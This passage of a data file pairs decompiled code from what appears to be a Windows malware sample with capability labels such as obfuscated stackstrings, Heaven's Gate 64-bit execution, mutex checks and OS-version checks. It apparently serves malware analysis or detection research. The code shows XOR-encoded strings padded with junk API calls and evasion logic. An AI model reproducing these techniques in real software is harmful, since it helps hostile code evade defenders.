0x5886f0) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    var_10h._0_2_ = 0x1b0d;\n    var_10h._2_1_ = 0x34;\n    var_10h._3_1_ = 0xc;\n    var_ch = var_ch & 0xff000000 | 0x4b4142;\n    var_8h = 0x587a4f4b;\n    var_4h._0_2_ = 0x706f;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_b4h = iVar6;\n    var_30h = &var_10h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar8 != 0xf2657) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_10h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 7);\n    var_28h = 0x2e223e35;\n    var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x47);\n    var_70h = 0x676c7166;\n    var_6ch._0_2_ = 0x5447;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_28h - iVar6;\n    var_8h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar8 != 0x683db0) {\n            *(iVar7 + iVar6) = *(&var_70h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_28h - iVar6];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 5);\n    *0x41d200 = var_cch;\n    *0x41d208 = var_c8h;\n    *0x41d20c = var_c4h;\n    *0x41d210 = var_c0h;\n    *0x41d214 = var_bch;\n    uVar10 = 0;\n    *0x41d218 = var_b8h;\n    *0x41d21c = var_b4h;\n    *0x41d220 = iVar6;\n    do {\n        iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, *(uVar10 + 0x41d200));\n        if (iVar6 != 0) {\n            fcn.00407f2b();\n        }\n        uVar10 = uVar10 + 4;\n    } while (uVar10 < 0x20);\n    var_1ch = 0x2a371121;\n    var_18h = 0x171e0419;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x19;\n    var_14h._2_2_ = 0x3413;\n    var_10h._0_2_ = 0x1104;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x21;\n    var_ch = CONCAT31(var_ch._1_3_, 0x76);\n    var_70h = 0x4f537877;\n    var_6ch._0_2_ = 0x4676;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_1ch - iVar6;\n    var_28h = iVar6;\n    do {\n        iVar8 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        puVar9 = extraout_ECX_00;\n        if (iVar8 != 0x3d9d66) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_70h + iVar7 % var_38h) ^ puVar9[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x11);\n    cVar3 = fcn.00407d2a(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00407f2b();\n    }\n    var_14h._1_1_ = 5;\n    var_14h._0_1_ = 2;\n    var_14h._2_2_ = 0x4c36;\n    var_10h._0_2_ = 0x351f;\n    var_10h._2_1_ = 0;\n    var_10h._3_1_ = 6;\n    var_ch = var_ch & 0xff000000 | 0x541257;\n    var_78h = 0x38446c54;\n    var_74h._0_1_ = 0x6a;\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_70h = iVar6;\n    var_30h = &var_14h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar8 != 0x2831bb) {\n            *(iVar7 + iVar6) = *(&var_78h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_14h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xb);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.00407f2b();\n    }\n    var_68h._0_1_ = 0x30;\n    var_68h._1_1_ = 5;\n    var_68h._2_2_ = 0x137e;\n    var_64h = 0x1b;\n    var_62h = 0xa640f31;\n    var_5eh = 0x2725;\n    var_5ch._0_2_ = 0x2511;\n    var_5ch._2_2_ = 0x284b;\n    var_58h._0_2_ = 0x302a;\n    var_58h._2_2_ = 0x1d3f;\n    var_54h._0_2_ = 0x2951;\n    var_54h._2_2_ = 0x2b28;\n    var_50h._0_2_ = 0x3914;\n    var_50h._2_1_ = 100;\n    var_50h._3_1_ = 4;\n    var_4ch._0_2_ = 0x3639;\n    var_4ch._2_1_ = 0x11;\n    var_4ch._3_1_ = 0x2f;\n    var_48h = 0x3356;\n    var_46h = 0x1a;\n    var_45h._0_1_ = 0x21;\n    var_45h._1_1_ = 0x11;\n    var_45h._2_1_ = 0x39;\n    var_45h._3_1_ = 0x51;\n    var_41h = 0x28;\n    uStack68 = 0x4422;\n    var_a8h = 0x47384a63;\n    var_a4h._0_2_ = 0x444c;\n    var_63h = var_68h._1_1_;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_78h = iVar6;\n    var_30h = &var_68h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        puVar9 = extraout_ECX_01;\n        if (iVar8 != 0x9d5b4c) {\n            puVar9 = iVar7 + iVar6;\n            *puVar9 = *(&var_a8h + iVar7 % var_38h) ^ puVar9[&var_68h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x2a);\n    cVar3 = fcn.00407d2a(puVar9, puVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00407f2b();\n    }\n    var_20h = 0x2730d0c;\n    var_1ch = 0xc0f5762;\n    var_18h = 0x4c641871;\n    var_14h._0_1_ = 0xe;\n    var_14h._1_1_ = 0xb;\n    var_14h._2_2_ = 0x371;\n    var_10h._0_2_ = 0x5762;\n    var_10h._2_1_ = 0xb;\n    var_10h._3_1_ = 0xb;\n    var_ch = 0x7a660078;\n    var_a0h = 0x35413839;\n    var_9ch._0_2_ = 0x7a56;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_a8h = iVar6;\n    var_30h = &var_20h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar8 != 0x279f1a) {\n            *(iVar7 + iVar6) = *(&var_a0h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_20h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.00407f2b();\n    }\n    var_50h._2_1_ = 6;\n    var_58h._0_2_ = 0x7d50;\n    var_58h._2_2_ = 0xb5e;\n    var_54h._0_2_ = 0x7a02;\n    var_54h._2_2_ = 0x7f51;\n    var_50h._0_2_ = 0x1e5e;\n    var_50h._3_1_ = 0x66;\n    var_4ch._0_2_ = 0x7c50;\n    var_4ch._2_1_ = 0x5a;\n    var_4ch._3_1_ = 0;\n    var_48h = 0x7a02;\n    var_46h = 0x55;\n    var_45h._0_1_ = 0x78;\n    var_45h._1_1_ = 0x5f;\n    var_45h._2_1_ = 2;\n    var_45h._3_1_ = 5;\n    var_41h = 0x57;\n    var_10h._0_2_ = 0x4b67;\n    var_10h._2_1_ = 0x6a;\n    var_10h._3_1_ = 0x33;\n    var_ch = CONCAT22(var_ch._2_2_, 0x5735);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_a0h = iVar6;\n    var_30h = &var_58h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar8 != 0xd83ee8) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_38h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar6 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 != 0) {\n        fcn.00407f2b();\n    }\n    var_58h._0_2_ = 0x7279;\n    var_58h._2_2_ = 0x566e;\n    var_54h._0_2_ = 0x6365;\n    var_54h._2_2_ = 26999;\n    var_50h._0_2_ = 0x7f59;\n    var_50h._2_1_ = 0x76;\n    var_50h._3_1_ = 0x70;\n    var_4ch._0_2_ = 0x5768;\n    var_4ch._2_1_ = 0x6b;\n    var_4ch._3_1_ = 0x7b;\n    var_48h = 0x7771;\n    var_46h = 0x5c;\n    var_45h._0_1_ = 0x60;\n    var_45h._1_1_ = 0x78;\n    var_45h._2_1_ = 0x75;\n    var_45h._3_1_ = 0x6e;\n    var_41h = 0x6e;\n    var_38h = 0x6e5a444e;\n    var_34h._0_1_ = 0x52;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_30h = &var_58h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar8 != 0xca0196) {\n            *(iVar7 + iVar6) = *(&var_38h + iVar7 % var_3ch) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar6);\n    iVar7 = var_a0h;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.00407f2b();\n    }\n    uVar5 = (*pcVar2)(0, iVar6);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_78h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_70h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_28h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_c8h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_cch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_2ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar11);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_80h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_b0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar10 = (*pcVar1)(uVar5);\n    return uVar10 & 0xffffff00;\n}\n",
        "token_count": 9619
    },
    "0040a4ab": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040a4ab(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_8h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            var_28h = 0x391f5827;\n            var_24h = 0x702c7422;\n            var_20h = 0x5815444e;\n            var_1ch = 0x74213902;\n            var_18h._0_2_ = 0x7058;\n            var_14h = 0x39705874;\n            var_10h._0_1_ = 0x44;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_4h = 5;\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar5 != 0xd1bf91) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_4h) ^ (iVar6 + piVar4)[&var_28h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_8h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_50h = 0x74576103;\n            var_4ch = 0x38155051;\n            var_48h = 0x61313703;\n            var_44h = 0x5052744a;\n            var_40h = 0x3735383d;\n            var_3ch = 0x74486120;\n            var_38h = 0x38005073;\n            var_34h = 0x61313700;\n            var_30h = 0x50587474;\n            var_2ch = 0x37743816;\n            var_14h = 0x74386150;\n            var_10h._0_1_ = 0x37;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            var_4h = 5;\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                if (iVar5 != 0x910884) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_4h) ^ (iVar6 + piVar4)[&var_50h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_8h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1095
    },
    "0040b061": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040b061(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    *0x41cb2c = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41cb40 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41cb30 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.004049fe();\n    fcn.0040aff8();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41cb58 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (*0x41cb58 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41cb58, &nSize);\n        if (iVar4 == 0) {\n            var_24h = 0x50797226;\n            var_20h = 0x723d3538;\n            var_1ch = 0x35245078;\n            var_18h._0_2_ = 0x7273;\n            pIdentifierAuthority = 0x50377273;\n            var_ch._0_2_ = 0x3573;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                if (iVar5 != 0x590adc) {\n                    cbSid = 6;\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % 6) ^ (iVar6 + iVar4)[&var_24h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41cb58, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.0040ac84();\n    }\n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41cb40 < 6) {\n                return 0;\n            }\n            fcn.0040b2db();\n            goto code_r0x0040b1f2;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x0040b1f2:\n    if (5 < *0x41cb40) {\n        fcn.0040b20b();\n    }\n    return 0;\n}\n",
        "token_count": 988
    },
    "0040fc00": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040fc00(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040fc55(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 185
    },
    "00401157": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.00401157(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    ushort var_48h;\n    uint var_46h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uchar *var_13h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_46h._0_1_ = 0x1a;\n    var_48h = 0x4334;\n    stack0xffffffb7 = 0x31762b68;\n    var_41h = 0x2e681d43;\n    var_3dh = 0x10433276;\n    var_39h = 0x3f762168;\n    var_35h = 0x24681343;\n    var_31h._0_1_ = 0x76;\n    var_31h._1_1_ = 0x38;\n    stack0xffffffcd = 0x27681643;\n    var_2bh = 0x9432576;\n    var_27h = 0x26763a68;\n    var_23h = 0x3d680c43;\n    var_1fh = 0xf432376;\n    var_1bh = 0x2c763068;\n    var_17h = 0x48680243;\n    var_13h._0_1_ = 0x76;\n    stack0xffffffec = 0x68784355;\n    var_ch._0_2_ = 0x7648;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar5 != 0x8af899) {\n            var_4h = 0x6;\n            *(iVar8 + iVar4) = *(&var_13h + iVar8 % 6 + 3) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.00401000();\n    puVar7 = uVar6 % 0x38 + 8;\n    unique0x10000112 = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = stack0xffffffec;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (stack0xffffffec != NULL) {\n                do {\n                    iVar8 = fcn.00401000();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 1009
    },
    "00404346": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404346(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_40h;\n    uint var_3ch;\n    uint var_37h;\n    uint var_33h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_15h;\n    uint var_11h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_40h = 0x58116f38;\n    var_8h = 6;\n    var_3ch._0_1_ = 6;\n    stack0xffffffc1 = 0x1d6f1d51;\n    var_37h = 0xe511758;\n    var_33h = 0x1a58316f;\n    var_2fh._0_2_ = 0x1f51;\n    var_2fh._2_1_ = 0x6f;\n    var_2bh = 0x3b510d58;\n    var_27h = 0x1d581b6f;\n    var_23h = 0x6f0551;\n    var_1fh = 0x3512058;\n    var_1bh._0_1_ = 0x6f;\n    stack0xffffffe3 = 0xa511158;\n    var_15h = 0x7458106f;\n    var_11h._0_1_ = 0x51;\n    stack0xffffffec = 0x58746f6b;\n    var_ch._0_2_ = 0x5174;\n    var_2fh._3_1_ = var_3ch;\n    var_1bh._1_1_ = var_3ch;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar4 != 0xb580bd) {\n            *(iVar5 + iVar3) = *(&var_11h + iVar5 % var_8h + 1) ^ (iVar5 + iVar3)[&var_40h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n        uVar2 = (*pcVar1)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        return;\n    }\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 749
    },
    "004049fe": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004049fe(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x1545193b;\n    var_20h._0_1_ = 0x1f;\n    var_20h._1_1_ = 2;\n    var_20h._2_2_ = 0x2101;\n    var_1ch._0_2_ = 0x442;\n    var_1ch._2_1_ = 0x18;\n    var_1ch._3_1_ = 0x1a;\n    var_18h._0_1_ = 0x6d;\n    var_14h = 0x6137706d;\n    var_10h._0_2_ = 0x636a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar5 != 0x77e940) {\n            var_4h = 6;\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % 6) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_24h = 0x361a0102;\n    var_20h._0_1_ = 8;\n    var_8h = 5;\n    var_20h._1_1_ = 5;\n    var_20h._2_2_ = 0x5a57;\n    var_1ch._0_2_ = 0x976;\n    var_1ch._3_1_ = 8;\n    var_18h._0_1_ = 0x68;\n    var_14h = 0x58686469;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x6d);\n    var_1ch._2_1_ = var_20h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_4h = &var_24h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        iVar5 = var_ch;\n        if (iVar6 != 0xbd5435) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_8h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 939
    },
    "00404ca4": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
